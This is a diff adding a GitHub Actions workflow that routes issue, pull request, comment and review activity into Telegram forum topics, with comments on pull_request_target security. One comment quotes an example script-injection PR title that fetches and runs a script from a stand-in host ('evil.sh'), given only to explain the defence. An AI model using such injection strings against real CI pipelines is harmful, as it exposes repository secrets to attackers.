@@ -1,0 +1,223 @@
+name: Notify Telegram
+
+# Routes GitHub activity into Telegram forum topics, split by what you would DO
+# about each thing rather than by which GitHub object it happens to be.
+#
+#   GH PR Opened     PR opened/reopened/ready · PR closed without merging
+#   GH PR Comments   comments on a pull request
+#   GH Reviews       review submitted (approved / changes requested) · code comments
+#   GH Issues        issue opened/reopened/closed · comments on an issue
+#   Dev Ops          PR MERGED — see below
+#
+# A merged PR is routed to Dev Ops, not to a PR topic, because merging is what
+# puts code on main. Sitting next to the green/red that follows it, the two read
+# as one entry: "this landed, and the tree is fine."
+#
+# ─────────────────────────────────────────────────────────────────────────────
+# ROUTING — the two traps.
+#
+# 1. GitHub has no "PR comment" event. A comment on a pull request arrives as
+#    `issue_comment`, exactly like a comment on an issue, because PRs are issues
+#    underneath. Routing on event name alone scatters every PR discussion into
+#    the Issues topic. `github.event.issue.pull_request` is non-null only for PR
+#    comments, and is how the two are told apart below.
+#
+# 2. Merged and abandoned PRs both arrive as `closed`. Only
+#    `github.event.pull_request.merged` distinguishes shipping from giving up —
+#    without it the channel congratulates you for PRs you rejected.
+#
+# ─────────────────────────────────────────────────────────────────────────────
+# SECURITY — read before editing.
+#
+# `pull_request_target` runs in the context of the BASE repo and therefore has
+# access to repository secrets. That is the only way a fork PR can trigger a
+# notification at all: with plain `pull_request`, secrets are withheld from fork
+# runs, so the Telegram token would be empty and nothing would send.
+#
+# `pull_request_target` is dangerous IF you check out and execute PR code, because
+# untrusted code then runs with your secrets in scope. This workflow therefore:
+#
+#   - has NO actions/checkout step, and must never gain one
+#   - runs no code from the PR
+#   - reads only `github.event` metadata, passed via env rather than interpolated
+#     into the shell (interpolating a PR title directly into `run:` is a script
+#     injection — a title like `"; curl evil.sh | sh; #` would execute)
+#   - requests `permissions: {}` — no token access at all
+#
+# If you ever need to run tests here, do it in test.yml under `pull_request`,
+# never in this file.
+# ─────────────────────────────────────────────────────────────────────────────
+
+on:
+  issues:
+    types: [opened, reopened, closed]
+  issue_comment:
+    types: [created]
+  pull_request_target:
+    types: [opened, reopened, ready_for_review, closed]
+  pull_request_review:
+    types: [submitted]
+  pull_request_review_comment:
+    types: [created]
+
+permissions: {}
+
+concurrency:
+  group: notify-${{ github.event_name }}-${{ github.event.issue.number || github.event.pull_request.number }}
+  cancel-in-progress: false
+
+jobs:
+  telegram:
+    runs-on: ubuntu-latest
+    # Bots are filtered out; your own activity is not. Own activity is marked
+    # "(you)" and left unbold in the payload below, so a real contributor's message
+    # still stands out at a glance rather than drowning in your own noise.
+    if: github.event.sender.type != 'Bot'
+    steps:
+      - name: Send Telegram message
+        env:
+          TG_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TG_CHAT: ${{ secrets.TELEGRAM_CHAT_ID }}
+          # Forum topics are variables rather than secrets: the ids are small
+          # integers that mean nothing without the chat, and keeping them editable
+          # in the UI means re-creating a topic doesn't need a commit.
+          TOPIC_PR_OPENED: ${{ vars.TELEGRAM_TOPIC_PR_OPENED }}
+          TOPIC_PR_COMMENTS: ${{ vars.TELEGRAM_TOPIC_PR_COMMENTS }}
+          # A merged PR is a deployment event, so it goes to Dev Ops rather than
+          # a PR topic — see the pull_request_target branch below.
+          TOPIC_DEVOPS: ${{ vars.TELEGRAM_TOPIC_DEVOPS }}
+          TOPIC_REVIEWS: ${{ vars.TELEGRAM_TOPIC_REVIEWS }}
+          TOPIC_ISSUES: ${{ vars.TELEGRAM_TOPIC_ISSUES }}
+          # Everything below is untrusted input — env, never inline interpolation.
+          KIND: ${{ github.event_name }}
+          ACTION: ${{ github.event.action }}
+          # A closed PR is either merged or abandoned; only `merged` tells them apart.
+          MERGED: ${{ github.event.pull_request.merged }}
+          ACTOR: ${{ github.event.sender.login }}
+          IS_OWNER: ${{ github.event.sender.login == github.repository_owner }}
+          # Non-null only when an issue_comment is on a PR. See ROUTING above.
+          COMMENT_ON_PR: ${{ github.event.issue.pull_request != null }}
+          REPO: ${{ github.repository }}
+          NUMBER: ${{ github.event.issue.number || github.event.pull_request.number }}
+          TITLE: ${{ github.event.issue.title || github.event.pull_request.title }}
+          URL: ${{ github.event.issue.html_url || github.event.pull_request.html_url }}
+          COMMENT: ${{ github.event.comment.body }}
+          COMMENT_URL: ${{ github.event.comment.html_url }}
+          REVIEW_STATE: ${{ github.event.review.state }}
+          REVIEW_BODY: ${{ github.event.review.body }}
+          REVIEW_URL: ${{ github.event.review.html_url }}
+        run: |
+          set -euo pipefail
+
+          if [ -z "${TG_TOKEN:-}" ] || [ -z "${TG_CHAT:-}" ]; then
+            echo "TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set — skipping."
+            exit 0
+          fi
+
+          # `export` matters — the python heredoc below is a subprocess and only
+          # sees exported variables. Without it every lookup KeyErrors and nothing sends.
+          export BODY=""
+          case "$KIND" in
+            issues)
+              export TG_TOPIC="${TOPIC_ISSUES:-}" LINK="$URL"
+              if [ "$ACTION" = "closed" ]; then
+                export ICON="☑️" WHAT="closed an issue"
+              else
+                export ICON="🐛" WHAT="opened an issue"
+              fi
+              ;;
+            pull_request_target)
+              export LINK="$URL"
+              if [ "$ACTION" = "closed" ]; then
+                # Merged and abandoned both arrive as `closed`, and they mean opposite
+                # things. A merge is what puts code on main, so it belongs in Dev Ops
+                # next to the green/red that follows it — read together they say "this
+                # landed and the tree is fine". An abandoned PR shipped nothing, so it
+                # stays with the rest of the PR lifecycle.
+                if [ "$MERGED" = "true" ]; then
+                  export ICON="🎉" WHAT="merged a pull request" TG_TOPIC="${TOPIC_DEVOPS:-}"
+                else
+                  export ICON="🚫" WHAT="closed a pull request without merging" TG_TOPIC="${TOPIC_PR_OPENED:-}"
+                fi
+              else
+                export ICON="🔀" WHAT="opened a pull request" TG_TOPIC="${TOPIC_PR_OPENED:-}"
+              fi
+              ;;
+            issue_comment)
+              export LINK="$COMMENT_URL"
+              export BODY="$(printf '%s' "$COMMENT" | head -c 300)"
+              if [ "$COMMENT_ON_PR" = "true" ]; then
+                export ICON="💬" WHAT="commented on a pull request" TG_TOPIC="${TOPIC_PR_COMMENTS:-}"
+              else
+                export ICON="💬" WHAT="commented on an issue" TG_TOPIC="${TOPIC_ISSUES:-}"
+              fi
+              ;;
+            pull_request_review)
+              export TG_TOPIC="${TOPIC_REVIEWS:-}" LINK="$REVIEW_URL"
+              export BODY="$(printf '%s' "$REVIEW_BODY" | head -c 300)"
+              case "$REVIEW_STATE" in
+                approved)          export ICON="✅" WHAT="approved a pull request" ;;
+                changes_requested) export ICON="🔴" WHAT="requested changes on a pull request" ;;
+                *)                 export ICON="👀" WHAT="reviewed a pull request" ;;
+              esac
+              ;;
+            pull_request_review_comment)
+              export ICON="📝" WHAT="commented on code" TG_TOPIC="${TOPIC_REVIEWS:-}"
+              export LINK="$COMMENT_URL"
+              export BODY="$(printf '%s' "$COMMENT" | head -c 300)"
+              ;;
+            *)
+              export ICON="🔔" WHAT="did something" TG_TOPIC="" LINK="$URL"
+              ;;
+          esac
+
+          # Build the payload with python so the title/comment are JSON-escaped
+          # properly. Shell quoting alone would break on quotes and newlines.
+          python3 - <<'PY' > /tmp/payload.json
+          import html, json, os
+
+          # Telegram's HTML parse_mode allows only a small tag set. An unescaped
+          # "<3" or "<script>" in a title returns 400 "can't parse entities" and the
+          # notification silently never arrives — so escape every untrusted value
+          # and keep only the tags we add ourselves.
+          def esc(value: str, limit: int) -> str:
+              return html.escape(value[:limit], quote=False)
+
+          icon, what = os.environ["ICON"], os.environ["WHAT"]
+
+          # Someone else's activity is bold so it stands out in a busy chat; your own
+          # is plain and tagged, so the channel stays scannable once you're in it too.
+          actor = esc(os.environ["ACTOR"], 80)
+          who = f"{actor} <i>(you)</i>" if os.environ.get("IS_OWNER") == "true" else f"<b>{actor}</b>"
+
+          lines = [
+              f'{icon} {who} {what}',
+              f'<code>{esc(os.environ["REPO"], 120)}</code> #{esc(os.environ["NUMBER"], 12)}',
+              "",
+              esc(os.environ["TITLE"], 200),
+          ]
+          body = os.environ.get("BODY", "").strip()
+          if body:
+              lines += ["", esc(body, 300)]
+          lines += ["", os.environ["LINK"]]
+
+          payload = {
+              "chat_id": os.environ["TG_CHAT"],
+              "text": "\n".join(lines),
+              "parse_mode": "HTML",
+              "disable_web_page_preview": False,
+          }
+          # Only send message_thread_id when a topic is configured: passing it to a
+          # non-forum chat is a 400, so an unset variable must mean "omit", not "0".
+          topic = (os.environ.get("TG_TOPIC") or "").strip()
+          if topic:
+              payload["message_thread_id"] = int(topic)
+          print(json.dumps(payload))
+          PY
+
+          curl -sS --fail-with-body --max-time 20 \
+            -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
+            -H 'Content-Type: application/json' \
+            -d @/tmp/payload.json > /dev/null
+
+          echo "Notified: $KIND #$NUMBER by $ACTOR -> topic ${TG_TOPIC:-General}"
